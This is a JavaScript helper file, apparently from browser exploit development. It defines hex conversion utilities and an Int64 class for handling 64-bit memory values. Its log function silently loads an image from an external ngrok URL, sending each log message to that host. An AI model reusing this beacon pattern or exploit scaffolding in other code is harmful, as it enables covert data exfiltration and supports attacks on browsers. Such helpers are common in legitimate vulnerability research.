function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function Int64(v) {
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };


    this.bytes = function() {
        return Array.from(bytes);
    };

    this.byteAt = function(i) {
        return bytes[i];
    };

    this.lower = function() {
        return bytes[0] + 256 * bytes[1] + 256*256*bytes[2] + 256*256*256*bytes[3];
    };

    this.upper = function() {
        return bytes[4] + 256 * bytes[5] + 256*256*bytes[6] + 256*256*256*bytes[7];
    };

    this.toInt = function() {
        return this.upper() * 2**32 + this.lower();
    }

    this.rshift = function() {
        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = bytes[i];
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }
    }

    this.lshift = function() {
        var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = bytes[i];
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }
    }

}


function log(x, doc = false) {
    if (typeof document !== "undefined" && doc) {
        document.write(x + " ");
    }
    console.log(x);

    img = new Image();
    img.src = `http://a2bb4355.ngrok.io/log2?log=${x.replace(" ", "_")}`;
}